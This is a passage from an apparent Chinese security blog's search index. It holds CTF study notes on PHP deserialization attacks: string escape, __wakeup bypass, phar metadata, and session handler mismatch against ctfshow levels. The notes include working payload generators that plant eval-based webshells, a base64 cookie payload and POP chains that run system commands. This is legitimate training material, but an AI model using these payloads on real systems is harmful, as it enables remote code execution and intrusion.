&#125;&#125;unserialize($_GET[&#x27;vip&#x27;]); \n\n在php7.4以上只要有_unserialize方法存在就可以覆盖掉_wake方法，所以我们只需要考虑_construct和_destruct和上面即可\n&lt;?phpclass ctfshowvip&#123;    public $username;    public $password;    public $code;    public function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;&#125;$a=serialize(new ctfshowvip(&#x27;877.php&#x27;,&#x27;&lt;?php eval($_POST[1])?&gt;&#x27;));echo urlencode($a);//1=system(&#x27;cat /flag_is_here&#x27;);\n\n还是有点不理解只能改属性是什么意思，感觉就是执行动作不可以改，但变量值和其他可以改动\n7.265error_reporting(0);include(&#x27;flag.php&#x27;);highlight_file(__FILE__);class ctfshowAdmin&#123;    public $token;    public $password;    public function __construct($t,$p)&#123;        $this-&gt;token=$t;        $this-&gt;password = $p;    &#125;    public function login()&#123;        return $this-&gt;token===$this-&gt;password;    &#125;&#125;$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);$ctfshow-&gt;token=md5(mt_rand());if($ctfshow-&gt;login())&#123;    echo $flag;&#125;\n\n&lt;?phpclass ctfshowAdmin&#123;    public $token;    public $password;    public function __construct($t,$p)&#123;        $this-&gt;token=$t;        $this-&gt;password = $p;    &#125;&#125;$admin=new ctfshowAdmin(1,2);$admin-&gt;token=&amp;$admin-&gt;password;echo urlencode(serialize($admin));\n\n我们可能控制随机的md5，唯一的办法只有让变量之间关联起来，就是使用关联符&amp;，没想到这个在反序列化里面也是可以使用的\n3.魔术方法//魔术方法 __construct()       //类的构造函数，创建对象时触发 __destruct()        //类的析构函数，对象被销毁时触发 __call()            //调用对象不可访问、不存在的方法时触发 __callStatic()     //在静态上下文中调用不可访问的方法时触发 __get()            //调用不可访问、不存在的对象成员属性时触发 __set()           //在给不可访问、不存在的对象成员属性赋值时触发 __isset()         //当对不可访问属性调用isset()或empty()时触发 __unset()         //在不可访问的属性上使用unset()时触发 __invoke()        //把对象当初函数调用时触发 __sleep()        //执行serialize()时，先会调用这个方法 __wakeup()       //执行unserialize()时，先会调用这个方法 __toString()     //把对象当成字符串调用时触发  __clone()        //使用clone关键字拷贝完一个对象后触发\n\n\n\n4.字符串逃逸这个和其他题目有点不一样，所以单独拿出来说，还是跟着ctfshow来学\n反序列化以;)结束，后面的字符串不影响正常的反序列化\n1.262关 字符串增多error_reporting(0);class message&#123;    public $from;    public $msg;    public $to;    public $token=&#x27;user&#x27;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from = $f;        $this-&gt;msg = $m;        $this-&gt;to = $t;    &#125;&#125;$f = $_GET[&#x27;f&#x27;];$m = $_GET[&#x27;m&#x27;];$t = $_GET[&#x27;t&#x27;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;    $msg = new message($f,$m,$t);    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));    setcookie(&#x27;msg&#x27;,base64_encode($umsg));    echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__);\n\n我们先来了解一下字符串逃逸\n&lt;?phpclass message&#123;    public $from;    public $msg;    public $to;    public $token=&#x27;user&#x27;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from = $f;        $this-&gt;msg = $m;        $this-&gt;to = $t;    &#125;&#125;$mes=new message(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;fuck&#x27;);echo serialize($mes);//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:4:&quot;fuck&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;//这是正常情况下的序列化结果，假如我们进行替换$mes1=serialize($mes);$mes2=str_replace(&#x27;fuck&#x27;,&#x27;loveU&#x27;,$mes1);//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:4:&quot;loveU&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;//我们可以看到，fuck变为了loveU,但前面象征着字符串字符数的数字还是4，也就是反序列化取值时只会取到love，//我们可以利用这个特性在传入fuck时在后面加上我们的payload,由于替换时会出现数目上的差，我们提交的payload就能被反序列化，就会不可上传的改变结果\n\n我们来实战解决它\n由于之前都是我们去创建对象，但这次我们仅传参数所以方法和以前有点不一样\n&lt;?phpclass message&#123;    public $from;    public $msg;    public $to;    public $token=&#x27;user&#x27;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from = $f;        $this-&gt;msg = $m;        $this-&gt;to = $t;    &#125;&#125;$mes=new message(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;);$mes1=serialize($mes);$mes2=str_replace(&#x27;fuck&#x27;,&#x27;loveU&#x27;,$mes1);echo $mes2;//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:4:&quot;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:135:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;\n\n经过我的不断努力，终于写出来了，规律就是我们先看payload的长度然后看逃逸字符数，我的payload长27个字符，所以写了27个fuck\n但是光改了数据也不行，源代码上面只发了个cookie，和flag没关系，其实在题目开头的注释里面提到了message.php文件,我们访问看下\nhighlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123;    public $from;    public $msg;    public $to;    public $token=&#x27;user&#x27;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from = $f;        $this-&gt;msg = $m;        $this-&gt;to = $t;    &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123;    $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;]));    if($msg-&gt;token==&#x27;admin&#x27;)&#123;        echo $flag;    &#125;\n\n果然和题解上的名字admin一样我们直接把payload提交即可\nf=a&amp;m=b&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;\n\n2.字符串减少我们之前学的字符串逃逸是在字符串增多的情况下通过字符串变多把payload挤出去，实现替换我们无法更改的属性。进行字符串逃逸的属性为被替换的属性。相反的是字符串减少的情况下，我们是通过把后面的字符串吸进来，让我们在后面属性写的payload替换掉被吸进去的属性\n没有什么简单的题目了，只能去写buu上面的题目了\n原理就是，我们通过传参，在经过题目替换序列化字符串之后，我们可以通过字符串逃逸改变我们属性的值\n3.变量名字符串逃逸我之前字符串减少是用变量值进行逃逸，但是这个需要我们可以同时控制被过滤属性和其后面属性加payload才能完成，但当我们只能传入一个属性的时候就不能这样了，\n我们可以考虑通过变量名被替换减小然后通过变量名逃逸把我们的表示字符串数目的字符串算到变量名即可\n&lt;?phpfunction filter($img)&#123;    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;    return preg_replace($filter,&#x27;&#x27;,$img);&#125;$a[&#x27;phpflag&#x27;]=&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#x27;;$aa=serialize($a);echo filter($aa);//未进行替换 a:1:&#123;s:7:&quot;phpflag&quot;;s:47:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;//替换后    a:1:&#123;s:7:&quot;&quot;;s:47:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;\n\n比如这个代码会把php和flag替换为空，我们可以发现，我们需要再伪造一个字符串比如\n//;s:1:&quot;1&quot;   作为前面被替换掉变更的 值\n\n详细情况看buuctf2.0 [安洵杯 2019]easy_serialize_php\n5.session话说真的是根据题目难易度排序的吗，为什么263关这么难\n1.263关这题主要是一下子到了个未知的领域，不明白的东西有点多\n首先，只有个登录界面，我们用dirsearch扫一下，发现目录下有www.zip，这很明显是网站根目录，我们解压缩查看\nerror_reporting(0);session_start();\t//超过5次禁止登陆if(isset($_SESSION[&#x27;limit&#x27;]))&#123;\t\t$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);\t&#125;else&#123;\t\t setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));\t\t $_SESSION[&#x27;limit&#x27;]= 1;\t&#125;\t?&gt;//这是index.php的PHP部分//2.我们观察到我们可以通过传入cookie的方式定义$_SESSION[&#x27;limit&#x27;]\n\nerror_reporting(0);require_once &#x27;inc/inc.php&#x27;;$GET = array(&quot;u&quot;=&gt;$_GET[&#x27;u&#x27;],&quot;pass&quot;=&gt;$_GET[&#x27;pass&#x27;]);if($GET)&#123;\t$data= $db-&gt;get(&#x27;admin&#x27;,\t[\t&#x27;id&#x27;,\t\t&#x27;UserName0&#x27;\t],[\t\t&quot;AND&quot;=&gt;[\t\t&quot;UserName0[=]&quot;=&gt;$GET[&#x27;u&#x27;],\t\t&quot;PassWord1[=]&quot;=&gt;$GET[&#x27;pass&#x27;] //密码必须为128位大小写字母+数字+特殊符号，防止爆破\t\t]\t]);\tif($data[&#x27;id&#x27;])&#123;\t\t//登陆成功取消次数累计\t\t$_SESSION[&#x27;limit&#x27;]= 0;\t\techo json_encode(array(&quot;success&quot;,&quot;msg&quot;=&gt;&quot;欢迎您&quot;.$data[&#x27;UserName0&#x27;]));\t&#125;else&#123;\t\t//登陆失败累计次数加1\t\t$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;])+1);\t\techo json_encode(array(&quot;error&quot;,&quot;msg&quot;=&gt;&quot;登陆失败&quot;));\t&#125;&#125;//这是check.php\n\nerror_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);//1.由于配置为php，我们盲猜默认配置为php_serialize，实际上也是的date_default_timezone_set(&quot;Asia/Shanghai&quot;);//这是inc/inc.php路径下php文件的部分，只需要知道这些即可//剩下的代码就是进行一个账号和密码的验证，太长了，而且和做题没关系class User&#123;    public $username;    public $password;    public $status;    function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function setStatus($s)&#123;        $this-&gt;status=$s;    &#125;    function __destruct()&#123;        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));    &#125;//还有个类忘了\n\n看完上面的代码后，我们先对SESSION有一个整体的认识\n我们在传入cookie后，服务器端会返回一个SESSIONID，然后会在服务器端生成一个文件用于储存SESSION\nSESSION数据会被序列化储存，然后session.serialize_handler和PHP 是PHP的INI配置项，用于定义会话数据序列化&#x2F;反序列化的处理引擎，区别在于\n\nphp（默认旧版）: 使用键名 + 竖线（|） + 值的格式，如 name|s:6:&quot;spoock&quot;;。\nphp_serialize（PHP5.5.4+默认）: 将数据序列化为数组结构，如 a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;&#125;\n\n主要区别在于，php模式的化会把拿到的键和值用|分隔开，然后对|后面的进行反序列化，我们可以通过这个特性，将对象序列化，然后让它反序列化我们构造内容\n刚好，我们在inc.php里面发现了一个类\nclass User&#123;    public $username;    public $password;    public $status;    function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function setStatus($s)&#123;        $this-&gt;status=$s;    &#125;    function __destruct()&#123;        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));    &#125;//用到了file_put_contents()函数，这个会自动创建文件，并写入指定内容，简直是间谍，我们可以利用这个，向php文件写入一句话木马class User&#123;    function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    &#125;$a=new User(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[1]) ?&gt;&#x27;) \n\n我们可以利用，cookie传入，然后在cookie被解码后创建对象的时候执行命令\nif(isset($_SESSION[&#x27;limit&#x27;]))&#123;$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);\t\t$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);\t&#125;else&#123;\t\t setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));\t\t $_SESSION[&#x27;limit&#x27;]= 1;\t&#125;\n\n这是index.php的代码，它把cookie写入了SESSION,我们的任务就完成了，只要等着$_SESSION[‘limit’]被读取然后写入即可\n提一下，这题实在太难了，估计以后也就我自己能看懂我写的题解，TMDB站上面那个讲wp的用了30分钟向我介绍了错误的思路，后面又用4分钟把题目解出来了\n&lt;?phpclass User&#123;    function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;&#125;$a=new User(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[1]) ?&gt;&#x27;);echo base64_encode(&#x27;|&#x27;.serialize($a));\n\n我们通过这串代码实现\n我们最后再来一次题解\n&lt;?phpclass User&#123;    function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;&#125;$a=new User(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);phpinfo(); ?&gt;&#x27;);//不知道为什么，这后面加点什么东西一句话木马才能生效，可能是编码方面的wecho base64_encode(&#x27;|&#x27;.serialize($a));//fE86NDoiVXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNToiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTsgPz4iO30=//我们把payload先通过cookie传入index.php\n\n然后再向check.php传入错误的信息，使得cookie写入SESSION\ncheck.php?u=1&amp;pass=2\n\n\n\n最后访问log-1.php\n\n\n最后命令执行即可\n\n\n终于结束了\n6.绕过方法1.序列化格式果然不行，csdn推荐的文章好垃圾，害我没学好序列化，只能在学一次\n我们首先解析一下序列化内容\n&lt;?phpclass test&#123;    public $a;    public $b;    function __construct()&#123;$this-&gt;a = &quot;xiaoshizi&quot;;$this-&gt;b=&quot;laoshizi&quot;;&#125;    function happy()&#123;return $this-&gt;a;&#125;&#125;$a = new test();echo serialize($a);?&gt;#O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;xiaoshizi&quot;;s:1:&quot;b&quot;;s:8:&quot;laoshizi&quot;;&#125;#O代表的是对象，4则是类名长度，2是属性数量，s是属性类型为字符串，1是长度\n\n而如果变量前是protected，则会在变量名前加上\\x00*\\x00,private则会在变量名前加上\\x00类名\\x00,输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式，如下：\n&lt;?phpclass test&#123;    protected  $a;    private $b;    function __construct()&#123;$this-&gt;a = &quot;xiaoshizi&quot;;$this-&gt;b=&quot;laoshizi&quot;;&#125;    function happy()&#123;return $this-&gt;a;&#125;&#125;$a = new test();echo serialize($a);echo urlencode(serialize($a));?&gt;#输出则会导致不可见字符\\x00的丢失#O:4:&quot;test&quot;:2:&#123;s:4:&quot; * a&quot;;s:9:&quot;xiaoshizi&quot;;s:7:&quot; test b&quot;;s:8:&quot;laoshizi&quot;;&#125;\n\n2.反序列化绕过小Trickphp7.1+反序列化对类属性不敏感\n我们前面说了如果变量前是protected，序列化结果会在变量名前加上\\x00*\\x00\n但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有\\x00*\\x00也依然会输出abc\n&lt;?phpclass test&#123;    protected $a;    public function __construct()&#123;        $this-&gt;a = &#x27;abc&#x27;;    &#125;    public function  __destruct()&#123;        echo $this-&gt;a;    &#125;&#125;unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;);#O:4:&quot;test&quot;:1:&#123;s:4:&quot; * a&quot;;s:3:&quot;abc&quot;;&#125; 正常序列化结果\n\n也就是说，当我们遇到原来类中出现protect和private属性的时候，可以尝试直接改为public进行pop链的构造\n3.绕过_wakeup()版本：\n PHP5 &lt; 5.6.25\n PHP7 &lt; 7.0.10\n利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行\n&lt;?phpclass test&#123;    public $a;    public function __construct()&#123;        $this-&gt;a = &#x27;abc&#x27;;    &#125;    public function __wakeup()&#123;        $this-&gt;a=&#x27;666&#x27;;    &#125;    public function  __destruct()&#123;        echo $this-&gt;a;    &#125;&#125;\n\n如果执行unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);输出结果为666\n而把对象属性个数的值增大执行unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);输出结果为abc\n虽然大佬是这么说，但是只又在new时才会输出’abc’，但改变数量的确可以绕过_wakeup\n4.关于php序列化复制吞字符这件事对于 private 属性，序列化结果会在属性名前加上 %00&lt;类名&gt;%00，其中 %00 是 ASCII 码为 0 的空字符的 URL 编码形式，&lt;类名&gt; 是定义该私有属性的类的名称。\n对于 protected 属性，序列化结果会在属性名前加上 %00*%00。\n就是这个%00，在正常输出会有点乱码，复制还会被吞，每次得我自己补上，在buuctf php上面我也是被卡了挺久的，就拿那道题的代码作为实例\n&lt;?phpclass Name&#123;    private $username = &#x27;admin&#x27;;    private $password = &#x27;100&#x27;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;&#125;$a = new Name(&#x27;admin&#x27;,100);echo serialize($a);echo urlencode(&#x27;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;&#x27;);//O:4:&quot;Name&quot;:3:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;i:100;&#125;复制结果，字符被吞变为ko//O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;\n\n\n\n5.关于同时序列化两个类之前我们都是对单独的一个类进行反序列化，但写Base CTF的时候才发现题目是一个简单的反序列化题目但是需要同时序列化多个类，这才想起来。\n我们直接拼接两个序列化结果肯定不行，但是可以把它们用数组的形式组合起来\n&lt;?phpclass ClassA &#123;public $varA;public function __wakeup() &#123;     echo &#x27;success&#x27;; &#125;&#125;class ClassB &#123;public $varB;&#125;$a = new ClassA();$b = new ClassB();// 序列化两个对象$serialized = serialize([$a, $b]);unserialize($serialized);//a:2:&#123;i:0;O:6:&quot;ClassA&quot;:1:&#123;s:4:&quot;varA&quot;;N;&#125;i:1;O:6:&quot;ClassB&quot;:1:&#123;s:4:&quot;varB&quot;;N;&#125;&#125;// 反序列化\n\n使用数组把两个类进行序列化\n\n\n成功执行_wakeup()，即成功反序列化\n7.phar反序列化Phar是将php文件打包而成的一种压缩文档，类似于Java中的jar包。它有一个特性就是phar文件会以序列化的形式储存用户自定义的meta-data。以扩展反序列化漏洞的攻击面，配合phar://协议使用。\n重点在于以序列化的形式储存用户自定义的meta-data\nPhar文件结构\na stub是一个文件标志，格式为 ：xxx&lt;?php xxx;__HALT_COMPILER();?&gt;。\nmanifest是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点。\ncontents是被压缩的内容。\nsignature签名，放在文件末尾。\n\n就是这个文件由四部分组成，每种文件都是有它独特的一种文件格式的，有首有尾。而__HALT_COMPILER();就是相当于图片中的文件头的功能，没有它，图片无法解析，同样的，没有文件头，php识别不出来它是phar文件，也就无法起作用。\n前提：生成phar文件需要修改php.ini中的配置，将phar.readonly设置为Off\n这就是phar生成文件的全部内容\n&lt;?phpclass test&#123;    public $name=&#x27;phpinfo();&#x27;;&#125;$phar=new phar(&#x27;test.phar&#x27;);//后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//设置stub$obj=new test();$phar-&gt;setMetadata($obj);//自定义的meta-data存入manifest//会自动进行序列化$phar-&gt;addFromString(&quot;flag.txt&quot;,&quot;flag&quot;);//添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;\n\n生成的所有文件\n\n\n//metadata.binO:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;\n\n该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar:&#x2F;&#x2F;伪协议，可以不依赖unserialize()直接进行反序列化操作。\nphar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。\n有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：\n\n\n这里使用file_get_contents()函数来进行实验。\n&lt;?phpclass test&#123;    public $name=&#x27;&#x27;;    public function __destruct()    &#123;        eval($this-&gt;name);    &#125;&#125;echo file_get_contents(&#x27;phar://test.phar/flag.txt&#x27;);?&gt;\n\n通过phar://伪协议解析phar文件时会将我们metadata.bin中的数据进行反序列化，其中内容我们可以自定义，我们只需要让类实例化即可\n上面代码在使用phar伪协议读取flag.txt的时候对其进行反序列化，实例化类触发__destruct()魔术方法，输出phpinfo()\n8.session反序列化session反序列化使用到的地方比较少，主要是利用php储存session需要对session的内容进行序列化储存\nsession的工作流程\n会话的工作流程很简单，当开始一个会话时，PHP 会尝试从请求中查找会话 ID （通常通过会话 cookie），如果发现请求的Cookies、Get、Post中不存在session id，PHP 就会自动调用php_session_create_id函数创建一个新的会话，并且在http response中通过set-cookie头部发送给客户端保存，如下图：\n\n\n有时候浏览器用户设置会禁止 cookie，当在客户端cookie被禁用的情况下，php也可以自动将session id添加到url参数中以及form的hidden字段中，但这需要将php.ini中的session.use_trans_sid设为开启，也可以在运行时调用ini_set来设置这个配置项。\n会话开始之后，PHP 就会将会话中的数据设置到 $_SESSION 变量中，如下述代码就是一个在 $_SESSION 变量中注册变量的例子：\n&lt;?phpsession_start();if (!isset($_SESSION[&#x27;username&#x27;])) &#123;  $_SESSION[&#x27;username&#x27;] = &#x27;xianzhi&#x27; ;&#125;?&gt;\n\n当 PHP 停止的时候，它会自动读取 $_SESSION 中的内容，并将其进行序列化， 然后发送给会话保存管理器来进行保存\n默认情况下，PHP 使用内置的文件会话保存管理器来完成session的保存，也可以通过配置项 session.save_handler 来修改所要采用的会话保存管理器。 对于文件会话保存管理器，会将会话数据保存到配置项session.save_path所指定的位置。\n整个流程大概如上所述，也可参考下述流程图：\n\n\n\n\n但是我们本来向session写入的pop链会被序列化储存，就失去了意义。\n这就需要用到一些漏洞了，我们先来了解一下php中不同配置下session的储存形式\n根据php.ini中的配置项，我们研究将$_SESSION中保存的所有数据序列化存储到PHPSESSID对应的文件中，使用的三种不同的处理格式，即session.serialize_handler定义的三种引擎：\n\n\n\n处理器\n对应的存储格式\n\n\n\nphp\n键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值\n\n\nphp_binary\n键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值\n\n\nphp_serialize (php&gt;&#x3D;5.5.4)\n经过 serialize() 函数反序列处理的数组\n\n\n我们看到这里其实已经可以发现问题了，就是我们当php中session保存和读取的处理器不同的时候会出现漏洞\n漏洞原理\nsession的反序列化漏洞，就是利用php处理器和php_serialize处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因\n也就是说只有php作为储存器然后php_serialize作为解释器的时候会存在session反序列化漏洞\n首先创建session.php，使用php_serialize处理器来存储session数据\n&lt;?phpini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];echo $_SESSION[&#x27;session&#x27;];?&gt;\n\ntest.php，使用默认php处理器来存储session数据\n&lt;?phpsession_start();class f4ke&#123;    public $name;    function __wakeup()&#123;      echo &quot;Who are you?&quot;;    &#125;    function __destruct()&#123;      eval($this-&gt;name);    &#125;&#125;$str = new f4ke();?&gt;\n\n接着，我们构建URL进行访问session.php：\nhttp://www.session-serialize.com/session.php?session=|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;\n\n这个竖线很明显是php处理器的储存方式，但是我们把其放入php_serialize处理器的代码中，我们直接来看储存的内容\na:1:&#123;s:7:&quot;session&quot;;s:45:&quot;|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;\n\n我们可以看到我们刚才的session被作为字符串储存起来了，但是我们看代码就会发现我们传入的那个数据还会把原来的&quot;&#125;给顶出去，就像字符串逃逸一样，但是这里不是重点\n因为php作为处理器去反序列化会用竖线将数据分为键名和序列化数据两部分，于是就是对我们O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;这个进行反序列化，所以这个还比字符串逃逸简单一点，直接往这里面写我们的pop即可\n9.反序列化的空格绕过我们之前命令执行的空格绕过在这里出了一些问题，就是反序列化的时候会对我们字符串进行字符数统计，如果字符数对不上就会出现无法反序列化的情况\n于是当我们使用%20，%0a，%09等url编码进行绕过时就会出现问题，我们在本地运行的时候是作为字符串被认作三个字符，然后我们将我们的反序列化数据传到后端的时候会进行url解码，这个时候就变为了一个字符，Tab回车这些都是一个字符，这个时候字符数目就不对了\n于是我们的思路就是先在序列化的时候使用一个字符进行占位，然后再将那个占位的字符改为%09然后这样就可以了解决了\nO:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;O:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;N;s:4:&quot;var2&quot;;O:5:&quot;flaag&quot;:2:&#123;s:5:&quot;var10&quot;;O:6:&quot;eenndd&quot;:1:&#123;s:7:&quot;command&quot;;s:17:&quot;passthru(&#x27;ls /&#x27;);&quot;;&#125;s:5:&quot;var11&quot;;i:213;&#125;&#125;s:4:&quot;var2&quot;;N;&#125;//改空格为%09O:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;O:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;N;s:4:&quot;var2&quot;;O:5:&quot;flaag&quot;:2:&#123;s:5:&quot;var10&quot;;O:6:&quot;eenndd&quot;:1:&#123;s:7:&quot;command&quot;;s:17:&quot;passthru(&#x27;ls%09/&#x27;);&quot;;&#125;s:5:&quot;var11&quot;;i:213;&#125;&#125;s:4:&quot;var2&quot;;N;&#125;\n\n然后就是不要想着直接使用Tab键，在不同情况下可能被识别为三个空格\n","tags":["PHP反序列化","反序列化绕过"]},{"title":"php命令执行","url":"/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","content":"命令执行漏洞笔记前言文件包含漏洞条件有点苛刻，在学不下的感觉，正好看了下linux命令，来看下命令执行漏洞\n1.什么是命令执行漏洞命令执行漏洞是一种网络安全漏洞，它允许攻击者在受影响的系统上执行恶意命令。这种漏洞通常出现在软件应用程序或系统中，其典型示例是 [Web 应用程序](https://so.csdn.net/so/search?q=Web 